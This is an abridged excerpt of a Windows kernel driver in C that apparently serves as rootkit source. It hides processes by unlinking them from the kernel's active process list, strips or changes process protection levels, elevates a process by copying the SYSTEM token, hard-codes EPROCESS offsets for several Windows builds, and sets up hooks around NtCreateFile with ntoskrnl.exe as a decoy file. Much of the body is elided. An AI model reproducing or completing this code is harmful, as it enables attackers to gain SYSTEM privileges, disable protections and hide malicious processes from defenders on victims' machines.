...
void IRP_MJCreate() { DbgPrint("IRP_CREATED\n"); }

void IRP_MJClose() { DbgPrint("IRP_CLOSED"); }
...
NTSTATUS UnprotectAllProcesses() {
  ...
  __try {
    ...
    while (plist->Flink != (PLIST_ENTRY)((char *)process +
                                         eoffsets.ActiveProcessLinks_offset)) {

      DbgPrint("Blink: %p, Flink: %p\n", plist->Blink, plist->Flink);

      ULONG_PTR EProtectionLevel = (ULONG_PTR)plist->Flink -
                                   eoffsets.ActiveProcessLinks_offset +
                                   eoffsets.protection_offset;
...
HideProcess(int pid) {
  ...
  __try {
    __try {
      ...
      plist =
          (PLIST_ENTRY)((char *)process + eoffsets.ActiveProcessLinks_offset);
      ...
      DbgPrint("Process '%wZ' is now hidden",
...
NTSTATUS InitializeOffsets(Phooklist hooklist) {
  ...
  else if (pversion.dwBuildNumber == 17134 || pversion.dwBuildNumber == 16299 ||
           pversion.dwBuildNumber == 150630) {
    eoffsets.ActiveProcessLinks_offset = 0x2E8;
    eoffsets.Token_offset = 0x358;
    eoffsets.protection_offset = 0x6CA;
  }

  else if (pversion.dwBuildNumber == 22631 || pversion.dwBuildNumber == 22621 ||
           pversion.dwBuildNumber == 22000) {
    eoffsets.ActiveProcessLinks_offset = 0x448;
    eoffsets.Token_offset = 0x4B8;
    eoffsets.protection_offset = 0x87A;
  }

  else if (pversion.dwBuildNumber >= 19041 && pversion.dwBuildNumber <= 19045) {
    eoffsets.ActiveProcessLinks_offset = 0x448;
    eoffsets.Token_offset = 0x4B8;
    eoffsets.protection_offset = 0x87A;
  }
  ...
  if (eoffsets.ActiveProcessLinks_offset && eoffsets.Token_offset &&
      eoffsets.protection_offset) {
  ...
  DbgPrint(
      "Unsupported Windows build %lu. Driver will not function correctly.\n",
...
NTSTATUS PrivilegeElevationForProcess(int pid) {
  ...
  __try {
    ...
    if (status != STATUS_SUCCESS) {
      ...
      default:
        DbgPrint(
            "Unknown error occurred while looking up system process ID.\n");
        break;
      }
      return status;
    }
    ...
    ULONG_PTR systemTokenAddress =
        (ULONG_PTR)systemProcess + eoffsets.Token_offset;
...
NTSTATUS
ChangeProtectionLevel(PCR_SET_PROTECTION_LEVEL ProtectionLevel) {
  PVOID process = NULL;
  ...
  PPS_PROTECTION EProtectionLevel =
      (PPS_PROTECTION)((ULONG_PTR)process + eoffsets.protection_offset);
...
NTSTATUS InitializeStructure(Phooklist hooklist_s) {
  ...
  RtlInitUnicodeString(&hooklist_s->decoyFile,
                       L"\\SystemRoot\\System32\\ntoskrnl.exe");

  hooklist_s->NtCreateFileAddress =
      MmGetSystemRoutineAddress(&NtCreateFile_STRING);
